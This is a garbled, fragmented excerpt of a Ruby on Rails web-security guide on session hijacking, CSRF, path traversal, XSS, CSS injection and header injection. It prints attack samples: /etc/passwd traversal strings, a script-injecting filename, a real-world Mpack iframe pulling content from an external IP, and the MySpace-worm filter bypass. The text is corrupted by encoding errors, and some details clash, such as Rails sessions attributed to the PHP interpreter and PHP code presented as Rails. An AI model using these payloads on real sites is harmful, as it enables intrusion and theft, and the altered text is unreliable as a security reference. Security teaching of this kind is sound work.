...
Web application frameworks are made to help developers building web applications. Some of them also help you with securing the web application. In fact one framework is not more secure than another: If you use it correctly, you will be able to build secure apps with many frameworks. Rails has some clever helper methods, for example against SQL injection, so that this is hardly a problem. Itâ€˜s nice to see that all of the Rails applications I audited had a good level of security.
...
In order to develop secure web applications you have to keep up to date on all layers and know your enemies. To keep up to date subscribe to security mailing lists, read security blogs and make updating and security checks a habit (check the <a href="#additional-resources">Additional Resources</a> chapter). I do it manually because thatâ€˜s how you find the nasty logical security problems.
...
A session id consists of the array value of a random string. The random string is the current time, a random number between 0 and 1, the process id number of the PHP interpreter (also basically a random number) and a constant string. Currently it is not feasible to brute-force Rails' session ids. To date MD5 is uncompromised, but there have been collisions, so it is theoretically possible to create another input text with the same array value. But this has had no security impact to date.
...
Hence, the cookie serves as temporary authentication for the web application. Everyone who seizes a cookie from someone else, may use the web application as this user â€?with possibly severe consequences. Here are some ways to hijack a session, and their countermeasures:
...
The main objective of most attackers is to make money. The underground prices for stolen bank login accounts range from $10â€?1000 (depending on the available amount of funds), $0.40â€?20 for credit card numbers, $1â€?8 for online auction site accounts and $4â€?30 for email passwords, according to the "Symantec Global Internet Security Threat Report":http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf.
...
It is important to notice that the actual crafted image or link doesn't necessarily have to be situated in the web application's domain, it can be anywhere â€?in a forum, blog post or email.

CSRF appears very rarely in CVE (Common Vulnerabilities and Exposures) -- less than 0.1% in 2006 -- but it really is a 'sleeping giant' [Grossman]. This is in stark contrast to the results in my (and others) security contract work â€?_(highlight)CSRF is an important security issue_.
...
If your web application is RESTful, you might be used to additional HTTP verbs, such as PUT or DELETE. Most of todayâ€˜s web browsers, however do not support them - only GET and POST. Rails uses a hidden +_method+ field to handle this barrier.
...
There are many other possibilities, including Ajax to attack the victim in the background.â€¨The  _(highlight)solution to this is including a security token in non-GET requests_ which check on the server-side. In Rails 2 or higher, this is a one-liner in the application controller:
...
Many web applications allow users to upload files. _(highlight)File names, which the user may choose (partly), should always be filtered_ as an attacker could use a malicious file name to overwrite any file on the server. If you store file uploads at /var/www/uploads, and the user enters a file name like â€?./../../etc/passwdâ€? it may overwrite an important file. Of course, the PHP interpreter would need the appropriate permissions to do so â€?one more reason to run web servers, database servers and other programs as a less privileged Unix user.

When filtering user input file names, _(highlight)don't try to remove malicious parts_. Think of a situation where the web application removes all â€?./â€?in a file name and an attacker uses a string such as â€?...//â€?- the result will be â€?./â€? It is best to use a whitelist approach, which _(highlight)checks for the validity of a file name with a set of accepted characters_. This is opposed to a blacklist approach which attempts to remove not allowed characters. In case it isn't a valid file name, reject it (or replace not accepted characters), but don't remove them. Here is the file name sanitizer from the "attachment_fu plugin":http://github.com/technoweenie/attachment_fu/tree/master:
...
The popular Apache web server has an option called DocumentRoot. This is the home directory of the web site, everything in this directory tree will be served by the web server. If there are files with a certain file name extension, the code in it will be executed when requested (might require some options to be set). Examples for this are PHP and CGI files. Now think of a situation where an attacker uploads a file â€œfile.cgiâ€?with code in it, which will be executed when someone downloads the file.
...
Simply pass a file name like â€?./../../etc/passwdâ€?to download the server's login information. A simple solution against this, is to _(highlight)check that the requested file is in the expected directory_:
...
Another example changed Google Adsense's e-mail address and password by. If the victim was logged into Google Adsense, the administration interface for Google advertisements campaigns, an attacker could change his credentials.â€?
...
public function signup
  $this->params['user'] #=> {'name' => â€œow3nedâ€? 'admin' => true}
...
Because of this, most web applications will display a generic error message â€œuser name or password not correctâ€? if one of these are not correct. If it said â€œthe user name you entered has not been foundâ€? an attacker could automatically compile a list of user names.
...
PHP uses a slightly different approach than many other languages to match the end and the beginning of a string. That is why even many PHP and Rails books make this wrong. So how is this a security threat? Imagine you have a File model and you validate the file name by a regular expression like this:
...
Whereas %0A is a line feed in URL encoding, so Rails automatically converts it to "file.txt\n&lt;script&gt;alert('hello')&lt;/script&gt;". This file name passes the filter because the regular expression matches â€?up to the line end, the rest does not matter. The correct expression should read:
...
The most common entry points are message posts, user comments, and guest books, but project titles, document names and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter â€?obvious, hidden or internal. Remember that the user may intercept any traffic. Applications, such as the "Live HTTP Headers Firefox plugin":http://livehttpheaders.mozdev.org/, or client-site proxies make it easy to change requests.
...
You can mitigate these attacks (in the obvious way) by adding the "httpOnly":http://trac.rails.org/ticket/8895 flag to cookies, so that document.cookie may not be read by JavaScript. Http only cookies can be used from IE v6.SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still considering, it ignores the option. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies "will still be visible using Ajax":http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/, though.
...
<html>
<iframe name=â€StatPageâ€?src="http://58.xx.xxx.xxx" width=5 height=5 style=â€display:noneâ€?</iframe>
</html>

This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iframe is taken from an actual attack on legitimate Italian sites using the "Mpack attack framework":http://isc.sans.org/diary.html?storyid=3015. Mpack tries to install malicious software through security holes in the web browser â€?very successfully, 50% of the attacks succeed.
...
Imagine a blacklist deletes â€œscriptâ€?from the user input. Now the attacker injects â€?lt;scrscriptipt&gt;â€? and after the filter, â€?lt;script&gt;â€?remains. Earlier versions of Rails used a blacklist approach for the strip_tags(), strip_links() and sanitize() method. So this kind of injection was possible:
...
This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus â€œget to know your enemyâ€? is the "Hackvertor":http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php. Railsâ€?sanitize() method does a good job to fend off encoding attacks.
...
In December 2006, 34,000 actual user names and passwords were stolen in a "MySpace phishing attack":http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html. The idea of the attack was to create a profile page named â€œlogin_home_index_htmlâ€? so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.
...
The eval() function is a nightmare for blacklist input filters, as it allows the style attribute to hide the word â€œinnerHTMLâ€?

<plain>
alert(eval('document.body.inne' + 'rHTML'));
</plain>

The next problem was MySpace filtering the word â€œjavascriptâ€? so the author used â€œjava&lt;NEWLINE&gt;script" to get around this:

<html>
<div id="mycode" expr="alert('hah!')" style="background:url('javaâ†µâ?script:eval(document.all.mycode.expr)')">
</html>
...
-- _The same security precautions have to be taken for Ajax actions as for â€œnormalâ€?ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn't render a view._

If you use the "in_place_editor plugin":http://trac.rails.org/browser/plugins/in_place_editing, or actions that return a string, rather than rendering a view, _(highlight)you have to escape the return value in the action_. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.
...
Besides that, it is _(highlight)important to know what you are doing when building response headers partly based on user input._ For example you want to redirect the user back to a specific page. To do that you introduced a â€œrefererâ€?field in a form to redirect to the given address:
...
And due to a bug in (PHP and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this:
...
Location:â€¨Content-Type: text/html
...
* The Rails security project posts security news regularly: "http://www.rorsecurity.info":http://www.rorsecurity.info
* Subscribe to the Rails security "mailing list":http://groups.google.com/group/rails-security
